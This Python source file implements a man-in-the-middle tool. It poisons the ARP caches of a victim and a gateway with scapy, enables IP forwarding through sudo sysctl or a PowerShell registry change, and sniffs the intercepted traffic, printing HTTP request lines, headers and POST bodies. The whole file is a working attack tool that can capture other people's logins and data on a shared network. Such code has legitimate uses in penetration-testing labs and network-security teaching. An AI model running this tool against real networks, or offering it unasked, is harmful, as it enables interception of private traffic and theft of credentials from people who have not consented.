import time
import threading
import os
import helper_functions  # Importing helper_functions
import signal
import scapy.all as scapy
from sys import exit
from colorama import Fore, init
class MITM:
    def __init__(self, target_ip1: str, target_ip2: str, packet_forwarding: bool = True, speed: int = 1):
        self.TARGET1 = target_ip1  # Usually the victim
        self.TARGET2 = target_ip2  # Usually the gateway
        self.SPEED = speed
        self.PACKET_FORWARDING = packet_forwarding
        init(autoreset=True)
        # Initialize DeviceInfo instance from helper_functions
        self.device_info = helper_functions.device_info()
        self.should_exit = False  # Flag to indicate if the process should exit
        # Signal handling for graceful exit
        signal.signal(signal.SIGINT, self.handle_interrupt)
    def handle_interrupt(self, signal_num, frame):
        self.should_exit = True  # Set the exit flag when interrupted
    def get_mac(self, ip):
        """
        Uses ARP to get the MAC address associated with an IP address.
        Returns None if the MAC address can't be found.
        """
        arp_request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")  # Broadcast MAC
        for _ in range(2):
            answered = scapy.srp(broadcast / arp_request, timeout=2, verbose=False)[0]  # Tries to 2 times to get a mac address
            if answered:
                return answered[0][1].hwsrc  # The MAC of the response
        return None
    def packet_sniff(self):
        # Sniffs packets between TARGET1 and TARGET2 and processes it
        print(f"[{Fore.GREEN}+{Fore.RESET}] Sniffing packets between {self.TARGET1} and {self.TARGET2}...\n")
        # Custom callback function to check for exit flag
        def custom_packet_handler(packet):
            if self.should_exit:
                return  # Stop processing packets if exit flag is set
            self.process_packet(packet)
        scapy.sniff(filter="ip", prn=custom_packet_handler, store=False)  # Capture all IP packets
    def process_packet(self, packet):
        # Processes the sniffed packet. Only prints packets between TARGET1 and TARGET2 check source IP and dest IP using IP layer of the packet.
        if packet.haslayer(scapy.IP):
            ip_src = packet[scapy.IP].src
            ip_dst = packet[scapy.IP].dst
            if (ip_src == self.TARGET1 and ip_dst == self.TARGET2) or (ip_src == self.TARGET2 and ip_dst == self.TARGET1):
                print(f"[{Fore.CYAN}SNIFFED{Fore.RESET}] {ip_src} -> {ip_dst}: {packet.summary()}")
                # If packet has extra data on it try to process and show formatted if successful
                if packet.haslayer(scapy.Raw):
                    try:
                        data = packet[scapy.Raw].load.decode("utf-8", errors="ignore")
                        print(f"[{Fore.BLUE}INFO{Fore.RESET}] HTTP DATA:")
                        self.show_http(data)
                    except Exception as e:
                        print(f"[{Fore.RED}!{Fore.RESET}] Failed to decode packet: {e}")
    def show_http(self, data):
        # Splits data and gives methods headers etc
        data_parts = data.split("\r\n")
        if data_parts[0].startswith("GET") or data_parts[0].startswith("POST"):
            print(f"[{Fore.MAGENTA}HTTP Request Line{Fore.RESET}]: {data_parts[0]}")
            method_line = data_parts[0]
            method, path, version = method_line.split()
            print(f"  ▸ Method: {method}")
            print(f"  ▸ Path: {path}")
            print(f"  ▸ Version: {version}")
            print(f"\n[{Fore.GREEN}Headers{Fore.RESET}]:")
            for line in data_parts[1:]:
                if line == "":
                    break
                if ":" in line:
                    key, value = line.split(":", 1)
                    print(f"  ▸ {key.strip()}: {value.strip()}")
            # Show body (POST form data, JSON, etc.)
            body_index = data.find("\r\n\r\n")
            if body_index != -1:
                body = data[body_index + 4:]
                if body.strip():
                    print(f"\n[{Fore.YELLOW}Body/Data{Fore.RESET}]:\n{body}")
        else:
            print(f"[{Fore.LIGHTBLUE_EX}Raw Data{Fore.RESET}]:\n{data}")
    def start_sniffing_in_thread(self):
        # Starts sniffing in a separate thread so that it doesn't block the spoofing process.
        sniff_thread = threading.Thread(target=self.packet_sniff, daemon=True)
        sniff_thread.start()
    def enable_packet_forwarding(self):
        if self.device_info.get_OS() == "windows":
            os.system('powershell -Command "Set-ItemProperty -Path \\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\" -Name IPEnableRouter -Value 1; Start-Service RemoteAccess"')
        else:
            os.system('sudo sysctl -w net.ipv4.ip_forward=1')
    def disable_packet_forwarding(self):
        if self.device_info.get_OS() == "windows":
            os.system('powershell -Command "Set-ItemProperty -Path \\"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\" -Name IPEnableRouter -Value 0; Stop-Service RemoteAccess"')
        else:
            os.system('sudo sysctl -w net.ipv4.ip_forward=0')
    def spoof(self):
        # Gets mac of TARGET1 and TARGET2 to intercept their traffic.
        mac1 = self.get_mac(self.TARGET1)
        mac2 = self.get_mac(self.TARGET2)
        if not mac1:
            print(f"[{Fore.RED}ERROR{Fore.RESET}] Could not find MAC for {self.TARGET1}")
            time.sleep(3)
            raise helper_functions.return_to_menu  # Returns to main menu by raising exception
        if not mac2:
            print(f"[{Fore.RED}ERROR{Fore.RESET}] Could not find MAC for {self.TARGET2}")
            time.sleep(3)
            raise helper_functions.return_to_menu
        print(f"[{Fore.BLUE}INFO{Fore.RESET}] Spoofing started between {self.TARGET1} and {self.TARGET2}")
        # Start sniffing in another thread
        self.start_sniffing_in_thread()
        try:
            if self.PACKET_FORWARDING:
                self.enable_packet_forwarding()
            while not self.should_exit:  # Check for exit flag
                # Create ARP packets for MAC spoofing
                pkt1 = scapy.Ether(dst=mac1) / scapy.ARP(op=2, pdst=self.TARGET1, hwdst=mac1, psrc=self.TARGET2)
                pkt2 = scapy.Ether(dst=mac2) / scapy.ARP(op=2, pdst=self.TARGET2, hwdst=mac2, psrc=self.TARGET1)
                # Send ARP spoof packets
                scapy.sendp(pkt1, verbose=False)
                scapy.sendp(pkt2, verbose=False)
                time.sleep(self.SPEED)  # Control the speed of sending packets
        except KeyboardInterrupt:
            print(f"\n[{Fore.RED}!{Fore.RESET}] User interruption detected. Restoring ARP tables...")
            self.restore()
            if self.PACKET_FORWARDING:
                print(f"\n[{Fore.RED}!{Fore.RESET}] User interruption detected. Disabling packet forwarding...")
                self.disable_packet_forwarding()
    def restore(self):
        # Restores the original ARP tables for both the victims.
        mac1 = self.get_mac(self.TARGET1)
        mac2 = self.get_mac(self.TARGET2)
        if not mac1 or not mac2:
            print(f"[{Fore.RED}!{Fore.RESET}] Could not restore ARP tables — MAC lookup failed.")
            return
        # Send ARP packets to restore the ARP tables for the victims
        pkt1 = scapy.Ether(dst=mac1) / scapy.ARP(op=2, pdst=self.TARGET1, hwdst=mac1, psrc=self.TARGET2, hwsrc=mac2)
        pkt2 = scapy.Ether(dst=mac2) / scapy.ARP(op=2, pdst=self.TARGET2, hwdst=mac2, psrc=self.TARGET1, hwsrc=mac1)
        # Send 10 ARP packets to each target to restore the ARP cache
        scapy.sendp(pkt1, count=10, verbose=False)
        scapy.sendp(pkt2, count=10, verbose=False)
        print(f"[{Fore.GREEN}+{Fore.RESET}] ARP tables restored. Exiting cleanly.")
